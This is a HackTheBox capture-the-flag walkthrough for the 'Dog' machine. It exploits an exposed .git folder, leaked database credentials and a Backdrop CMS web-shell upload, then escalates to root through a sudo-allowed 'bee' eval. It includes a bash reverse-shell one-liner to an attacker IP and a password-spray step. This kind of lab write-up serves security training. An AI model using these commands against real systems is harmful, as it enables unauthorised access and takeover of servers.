---
title: Dog
categories: [HackTheBox]
tags: [cve, codereview]
media_subpath: /images/hackthebox_dog/
image:
  path: 'https://labs.hackthebox.com/storage/avatars/426830ea2ae4f05f7892ad89195f8276.png'
---

# Summary 
Dog is a retired easy HackTheBox machine that involves exploiting a vulnerable version of Backdrop CMS to gain initial access by reading an exposed `.git` folder, enumerating valid username and password for the administration page and exploiting a vulnerability from the running version of the CMS, followed by privilege escalation through a backdrop CMS cli utilitary, called `bee`.

# Walkthrough

## Nmap Scan

```bash
sudo nmap -Pn -sVC -oN nmap $IP -p-
```

```bash
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
```

From the `nmap` scan we have an indication that the target is running an Ubuntu server with SSH and HTTP services open.


## 80 - Web Server
### Enumeration

By first accessing the web server, we can see a simple page with a dog image and a link to a login page.

![NON](file-20250711125430776.png)

Looking at the bottom of the page, we can see that the web server is running with the `Backdrop CMS`, which is an open-source content management system (CMS) designed for small to medium-sized websites.

![NON](file-20250711135239693.png)

Since it is an open-source CMS, we can search for the files present in the web server. Looking at the source code of the page, we can see that there is a `robots.txt` file, `LICENSE` and `README.md` files.

![NON](file-20250711125904971.png)

![NON](file-20250711125913714.png)
There was not much information on those files, so I started with the `dirsearch` tool to enumerate the directories and files present in the web server.

```bash
dirsearch -u http://10.10.11.58
```

![NON](file-20250711130003853.png)

There was an exposed `.git` folder, which we can use to reconstruct the source code of the web server, look at previous commits, and find sensitive information.

To dump the contents of the `.git` folder, we can use the `git-dumper` tool.

```bash
git-dumper http://10.10.11.58 src
```

And now we have the source code of the web server in the `src` folder.
![NON](file-20250711130247742.png)

### Finding sensitive information
Looking at the `settings.php` file, we can see that the web server is using a MySQL database alongside with the `root` credentials of the database.

![NON](file-20250711130311632.png)

There was also a folder made of random characters, which would not be caught by the `dirsearch` tool.

![NON](file-20250711130445924.png)

There are 6133 files on that folder, and it is not possible to look at all of them manually. So we can use the `grep` command to search for interesting strings in those files.

#### Finding valid username
We start by searching for references to the `dog` word, which is the name of the target machine, which gave us a possible username.

![NON](file-20250711130618738.png)

Trying to login with that username and the password we found in the `settings.php` file, we can successfully login into the web server.

![NON](file-20250711130953412.png)


Looking at the `status report` page, we found the current version of the `CMS` running at the target, being `1.27.1`

![NON](file-20250711140355258.png)

Looking at public exploites for that specific version, we can find an [authenticated remote command execution vulnerability](https://www.exploit-db.com/exploits/52021), which allows us to execute arbitrary commands on the target machine.

### Exploiting the vulnerability
By running the exploit, it creates a `shell.zip` file, which we can use to install a custom module on the server and from there we can execute arbitrary commands.

![NON](file-20250711131725453.png)

![NON](file-20250711131704830.png)

By sending the `zip` file created by the exploit, we received an error message indicating that `zip` files are not allowed to be uploaded, it only allows `tar, tgz, gz and bz2` files.


```bash
tar -czvf shell.tar.gz shell/*
```


![NON](file-20250711140715542.png)

So instead of using the `zip` file, we created the `tar.gz` file with the same contents, which is the `shell.zip` file.

After that, we try accessing the `shell` module, which is located at `modules/shell/shell.php`, and we have a simple web shell that allows us to execute commands on the target machine.

![NON](file-20250711131847934.png)

## Foothold
We sen our reverse shell payload `bash -c 'bash -i >& /dev/tcp/10.10.14.17/9999 0>&1'`, and got access to the target machine.

![NON](file-20250711131944291.png)

### Lateral Privilege Escalation
Looking at the `/etc/passwd` file, we can see that the following users are present on the target machine:

```bash
cat /etc/passwd | grep "sh$"
```

```bash
root:x:0:0:root:/root:/bin/bash
jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

Trying a password spray with the password we found in the `settings.php` file, we can successfully login into the `johncusack` user.

![NON](file-20250711133333620.png)

## Privilege Escalation
Looking at the `sudo` permissions of the `johncusack` with `sudo -l`, we can see that the user can run the `bee` binary as root without a password.
![NON](file-20250711133356334.png)

Bee is a command-line tool utility for the Backdrop CMS, we can see its [documentation here](https://github.com/backdrop-contrib/bee).

Looking at the help section of the `Bee` binary, we can see that it can run arbitrary php code, making it possible to escalate privileges to root.

![NON](file-20250711133501856.png)
Trying to execute the command with the `eval` flag, we receive an error message "The required bootstrap level for `eval` is not ready."


![NON](file-20250711133540530.png)

Looking at the help, we see it is trying to use the `--root` flag at our current working directory, which is not a valid Backdrop CMS root directory. So we can use the `--root` flag to specify the root directory of the Backdrop CMS, which is `/var/www/html`, or run the command from that directory, granting us `root` command execution.

![NON](file-20250711141853268.png)

![NON](file-20250711133846290.png)
